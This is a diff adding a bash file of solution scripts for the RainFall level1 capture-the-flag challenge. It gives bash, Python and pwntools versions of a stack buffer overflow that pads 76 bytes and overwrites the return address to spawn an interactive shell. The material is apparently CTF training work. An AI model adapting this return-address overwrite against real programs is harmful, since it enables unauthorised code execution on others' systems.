@@ -1,0 +1,23 @@
+#!/bin/bash
+# Exploit scripts for RainFall level1
+# Use responsibly — only on the CTF/binary you own or have permission to test.
+
+# 1) Bash exploit: overwrite return address at offset 76 with 0x08048444 (little-endian)
+# This keeps stdin connected using 'cat' so the spawned shell is interactive.
+( printf '%.0sA' {1..76}; printf '\x44\x84\x04\x08\n'; cat ) | ./level1
+
+# 2) Python one-liner equivalent
+# Note: some shells require using python3 and escaping differently.
+( python -c "import sys; sys.stdout.write('A'*76 + '\\x44\\x84\\x04\\x08')"; cat ) | ./level1
+
+# 3) Pwntools (optional) - more robust exploit script
+# Save as exploit_pwntools.py and run with: python3 exploit_pwntools.py
+# Requires pwntools installed: pip install pwntools
+
+# from pwn import *
+# p = process('./level1')
+# payload = b'A'*76 + p32(0x08048444)
+# p.sendline(payload)
+# p.interactive()
+
+# End of file
